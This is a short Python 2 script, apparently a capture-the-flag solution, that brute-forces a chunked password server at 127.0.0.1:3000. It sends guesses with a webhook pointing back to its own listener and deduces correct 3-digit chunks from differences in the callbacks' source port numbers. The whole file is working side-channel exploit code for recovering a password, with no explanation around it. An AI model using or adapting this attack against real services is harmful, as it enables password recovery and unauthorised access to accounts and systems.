#! /usr/bin/python

import socket
import threading
import requests
import os
import string

portnumber = 0 # current port
chunk = "" # current chunk
myPort = 65533 # some high port
KNOWN_CHUNK = "" # known prefix

def invertAndPrint( pwVsPortDiff, chunk ):
	print "Tries for chunk ",chunk," causing rare port difference"
	inv_map = {}
	for k, v in pwVsPortDiff.iteritems():
		inv_map[v] = inv_map.get(v, [])
		inv_map[v].append(k)
	for key, val in inv_map.items():
		if len(val) < 10:
		    print "port diff ",key
		    print "PW chunk ",val

def computeChunk( knownChunk ):
   	prevPort = 0
	prevChunk = "000"
	pwVsPortDiff = {}
        for x in range(0,10):
            for y in range(0,10):
                for z in range(0,10):
			global chunk
			chunk = str(x)+str(y)+str(z)
			pwAttempt = knownChunk+chunk
			pwAttempt = pwAttempt.ljust(12, 'x')
                        payload = '{"password": "'+pwAttempt+'", "webhooks": ["127.0.0.1:'+str(myPort)+'"]}'
                        r = requests.post("http://127.0.0.1:3000", data=payload)
			newPort = portnumber
			pwVsPortDiff[prevChunk]=newPort-prevPort
			prevChunk = chunk
			prevPort = newPort
	return pwVsPortDiff

class ServerThread ( threading.Thread ):
   def run ( self ):

	# Set up the server:
	server = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
	server.bind ( ( '', myPort ) )
	server.listen ( 5 )

	# Have the server serve "forever":
	while True:
   		channel, details = server.accept()
      		global portnumber
      		portnumber = channel.getpeername()[1]
		result = str(channel.recv ( 1024 ))
		if "true" in result.lower():
                	print 'Password complete with last chunk: '+KNOWN_CHUNK+"%03d" % (int(chunk)-1)
			os._exit(0)
      		channel.close()


class ChunkThread ( threading.Thread ):
   def run ( self ):
	pwVsPortDiff = computeChunk(KNOWN_CHUNK)
	invertAndPrint( pwVsPortDiff, KNOWN_CHUNK)
	os._exit(0)


ServerThread().start()
ChunkThread().start()
